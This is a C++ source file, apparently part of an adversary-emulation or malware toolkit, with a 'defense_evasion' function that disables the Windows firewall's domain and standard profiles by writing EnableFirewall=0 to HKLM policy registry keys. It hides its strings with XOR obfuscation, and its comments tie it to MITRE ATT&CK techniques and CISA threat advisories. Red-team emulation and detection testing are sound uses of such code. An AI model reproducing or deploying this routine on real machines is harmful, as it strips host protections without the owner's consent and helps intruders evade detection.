#include "crypto/xor_obfuscation.hpp"
#include "defense_evasion.hpp"
#include "logger.hpp"
#include "registry.hpp"

namespace defense_evasion {

/*
 * DisableFirewall:
 *      About:
 *          Disables the Windows firewall (domain and standard profiles) via registry edits. Registry key edits are as follows:
 *          - HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile
 *              - EnableFirewall set to 0
 *          - HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile
 *              - EnableFirewall set to 0
 *          Registry edits are performed using the RegCreateKeyExW and RegSetValueExW API calls.
 *      Result:
 *          Disables Windows firewall.
 *      MITRE ATT&CK Techniques:
 *          T1562.004: Impair Defenses: Disable or Modify System Firewall
 *          T1112: Modify Registry
 *      CTI:
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 *      Other References:
 *          https://admx.help/?Category=Windows_11_2022&Policy=Microsoft.Policies.WindowsFirewall::WF_EnableFirewall_Name_1
 *          https://admx.help/?Category=Windows_11_2022&Policy=Microsoft.Policies.WindowsFirewall::WF_EnableFirewall_Name_2
 */
void DisableFirewall() {
    bool full_success = true;

    // Domain profile
    if (!registry::WriteRegistry(HKEY_LOCAL_MACHINE, XOR_WIDE_LIT(L"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile"), XOR_WIDE_LIT(L"EnableFirewall"), 0)) {
        full_success = false;
        XorLogger::LogError(XOR_LIT("Failed to disable domain profile firewall via registry."));
    } else {
        XorLogger::LogDebug(XOR_LIT("Disabled the domain profile firewall."));
    }

    // Standard profile
    if (!registry::WriteRegistry(HKEY_LOCAL_MACHINE, XOR_WIDE_LIT(L"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile"), XOR_WIDE_LIT(L"EnableFirewall"), 0)) {
        full_success = false;
        XorLogger::LogError(XOR_LIT("Failed to disable standard profile firewall via registry."));
    } else {
        XorLogger::LogDebug(XOR_LIT("Disabled the standard profile firewall."));
    }

    if (full_success) {
        XorLogger::LogInfo(XOR_LIT("Successfully disabled the Windows firewall via registry."));
    } else {
        XorLogger::LogError(XOR_LIT("One or more registry writes failed when attempting to disable the Windows firewall via registry."));
    }
}

} // namespace
